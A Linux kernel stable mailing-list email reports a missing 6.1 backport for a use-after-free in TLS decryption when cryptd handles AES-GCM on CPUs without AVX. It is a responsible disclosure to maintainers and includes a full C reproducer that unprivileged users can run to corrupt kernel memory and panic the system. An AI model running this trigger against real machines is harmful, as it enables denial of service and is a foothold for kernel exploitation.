Return-Path: <stable+bounces-167053-lists+stable=lfdr.de@vger.kernel.org>
X-Original-To: lists+stable@lfdr.de
Delivered-To: lists+stable@lfdr.de
Received: from sy.mirrors.kernel.org (sy.mirrors.kernel.org [IPv6:2604:1380:40f1:3f00::1])
	by mail.lfdr.de (Postfix) with ESMTPS id D0C72B212C4
	for <lists+stable@lfdr.de>; Mon, 11 Aug 2025 19:04:32 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sy.mirrors.kernel.org (Postfix) with ESMTPS id 6B0967B1D9D
	for <lists+stable@lfdr.de>; Mon, 11 Aug 2025 17:02:50 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 84A1F262FF1;
	Mon, 11 Aug 2025 17:04:02 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=willsroot.io header.i=@willsroot.io header.b="P7khkwGU"
X-Original-To: stable@vger.kernel.org
Received: from mail-10624.protonmail.ch (mail-10624.protonmail.ch [79.135.106.24])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B67DF286433
	for <stable@vger.kernel.org>; Mon, 11 Aug 2025 17:03:59 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=79.135.106.24
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1754931842; cv=none; b=K3dDZJrpcw0eyGkuEkgqPPSZLX1q1VVuO+zF08skfvK0qm2eWn7RxvdDPk5r7I2w5Sow33pIc9f8j0K9eOMSvTcD4Od30bodzbEAjneYdt0IxqSERsOo14N+0NbHk0ta9o6sSP6IZ8viMxZ7bRaAm/sEsCzqT3FuTspTP1sZSr0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1754931842; c=relaxed/simple;
	bh=7cUKkyYHTauJlJoSDm7aQ6chUaavvGuupfo85YrXibM=;
	h=Date:To:From:Cc:Subject:Message-ID:MIME-Version:Content-Type; b=jvy5kwcGlzxBQ+zLWerBl4ffl9n37H50lKsC0qsSYhYwzVJgbwERO4y8OOMqLItTgcO+sg9NDSV8vznucyh49+wuhJbhbPpFRScMN6LWU7wwoz0PBDxULWBu3Xz9C3hSfbWL9eAKa7CA/FtQhiiwTXxse0SEhv74BTiy8J7inH4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=willsroot.io; spf=pass smtp.mailfrom=willsroot.io; dkim=pass (2048-bit key) header.d=willsroot.io header.i=@willsroot.io header.b=P7khkwGU; arc=none smtp.client-ip=79.135.106.24
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=willsroot.io
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=willsroot.io
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=willsroot.io;
	s=protonmail2; t=1754931831; x=1755191031;
	bh=HT42lsSm+IZ/cej5rhvGMCIS35tYGM41VbPIooh0P6c=;
	h=Date:To:From:Cc:Subject:Message-ID:Feedback-ID:From:To:Cc:Date:
	 Subject:Reply-To:Feedback-ID:Message-ID:BIMI-Selector;
	b=P7khkwGUIh6ZWyzdGyKgnt+68umFQs7P9CjR9YiK5NcGf4jCEr5sudEr1EB39NpBK
	 roiyvbd4RfiTbT3Hqm1O4ZizL/qVr8GDn4OIUaAEB42RwfRGqJRk4b5CFfMistIaYs
	 mWyLlx3GuyLhoQy1hOBKVHQT9yNsxktplLsK6YqXvD4TKcHrh1ig+gJ+1KIg1aPsQu
	 1wEW6WPqpGH+2GNUlfBDPWsOeaAXD0cCbjSpuGLU+maCjXDa4iKrmpcfL4J+D6q2iM
	 26IFXxjvBvc7cN4dzA9zqDFKd3LTgHvNP6HzQrg0VVZMA2PwWUeaWTG+HjnUgybT8g
	 Bk2wHD7m9JRGA==
Date: Mon, 11 Aug 2025 17:03:47 +0000
To: "stable@vger.kernel.org" <stable@vger.kernel.org>
From: William Liu <will@willsroot.io>
Cc: "sd@queasysnail.net" <sd@queasysnail.net>, Jakub Kicinski <kuba@kernel.org>, "netdev@vger.kernel.org" <netdev@vger.kernel.org>, Savy <savy@syst3mfailure.io>, "john.fastabend@gmail.com" <john.fastabend@gmail.com>, "borisp@nvidia.com" <borisp@nvidia.com>
Subject: [BUG] Missing backport for UAF fix in interaction between tls_decrypt_sg and cryptd_queue_worker
Message-ID: <he2K1yz_u7bZ-CnYcTSQ4OxuLuHZXN6xZRgp6_ICSWnq8J5FpI_uD1i_1lTSf7WMrYb5ThiX1OR2GTOB2IltgT49Koy7Hhutr4du4KtLvyk=@willsroot.io>
Feedback-ID: 42723359:user:proton
X-Pm-Message-ID: d0069bd53d5739e83984cc5f94c0b732173af8b5
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Hi all,

Commit 41532b785e (tls: separate no-async decryption request handling from =
async) [1] actually covers a UAF read and write bug in the kernel, and shou=
ld be backported to 6.1. As of now, it has only been backported to 6.6, bac=
k from the time when the patch was committed. The commit mentions a non-rep=
roducible UAF that was previously observed, but we managed to hit the vulne=
rable case.

The vulnerable case is when a user wraps an existing crypto algorithm (such=
 as gcm or ghash) in cryptd. By default, cryptd-wrapped algorithms have a h=
igher priority than the base variant. tls_decrypt_sg allocates the aead req=
uest, and triggers the crypto handling with tls_do_decryption. When the cry=
pto is handled by cryptd, it gets dispatched to a worker that handles it an=
d initially returns EINPROGRESS. While older LTS versions (5.4, 5.10, and 5=
.15) seem to have an additional crypto_wait_req call in those cases, 6.1 ju=
st returns success and frees the aead request. The cryptd worker could stil=
l be operating in this case, which causes a UAF.=20

However, this vulnerability only occurs when the CPU is without AVX support=
 (perhaps this is why there were reproducibility difficulties). With AVX, a=
esni_init calls simd_register_aeads_compat to force the crypto subsystem to=
 use the SIMD version and avoids the async issues raised by cryptd. While I=
 doubt many people are using host systems without AVX these days, this envi=
ronment is pretty common in VMs when QEMU uses KVM without using the "-cpu =
host" flag.

The following is a repro, and can be triggered from unprivileged users. Mul=
tishot KASAN shows multiple UAF reads and writes, and ends up panicking the=
 system with a null dereference.

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/tcp.h>
#include <linux/tls.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <linux/if_alg.h>
#include <signal.h>
#include <sys/wait.h>
#include <time.h>

struct tls_conn {
    int tx;
    int rx;
};

void tls_enable(int sk, int type) {
    struct tls12_crypto_info_aes_gcm_256 tls_ci =3D {
        .info.version =3D TLS_1_3_VERSION,
        .info.cipher_type =3D TLS_CIPHER_AES_GCM_256,
    };

    setsockopt(sk, IPPROTO_TCP, TCP_ULP, "tls", sizeof("tls"));
    setsockopt(sk, SOL_TLS, type, &tls_ci, sizeof(tls_ci));
}

struct tls_conn *tls_create_conn(int port) {
    int s0 =3D socket(AF_INET, SOCK_STREAM, 0);
    int s1 =3D socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in a =3D {
        .sin_family =3D AF_INET,
        .sin_port =3D htons(port),
        .sin_addr =3D htobe32(0),
    };

    bind(s0, (struct sockaddr*)&a, sizeof(a));
    listen(s0, 1);
    connect(s1, (struct sockaddr *)&a, sizeof(a));
    int s2 =3D accept(s0, 0, 0);
    close(s0);
   =20
    tls_enable(s1, TLS_TX);
    tls_enable(s2, TLS_RX);

    struct tls_conn *t =3D calloc(1, sizeof(struct tls_conn));

    t->tx =3D s1;
    t->rx =3D s2;

    return t;
}

void tls_destroy_conn(struct tls_conn *t) {
    close(t->tx);
    close(t->rx);
    free(t);
}

int tls_send(struct tls_conn *t, char *data, size_t size) {
    return sendto(t->tx, data, size, 0, NULL, 0);
}

int tls_recv(struct tls_conn *t, char *data, size_t size) {
    return recvfrom(t->rx, data, size, 0, NULL, NULL);
}

int crypto_register_algo(char *type, char *name) {
   =20
    int s =3D socket(AF_ALG, SOCK_SEQPACKET, 0);

    struct sockaddr_alg sa =3D {};

    sa.salg_family =3D AF_ALG;
    strcpy(sa.salg_type, type);
    strcpy(sa.salg_name, name);

    bind(s, (struct sockaddr *)&sa, sizeof(sa));
    close(s);
   =20
    return 0;
}

int main(void) {
    char buff[0x2000];
    crypto_register_algo("aead", "cryptd(gcm(aes))");
    struct tls_conn *t =3D tls_create_conn(20000);
    tls_send(t, buff, 0x10);
    tls_recv(t, buff, 0x100);
}

Feel free to let us know if you have any questions and if there is anything=
 else we can do to help.

Best,
Will
Savy

[1] https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/comm=
it/?id=3D41532b785e9d79636b3815a64ddf6a096647d011

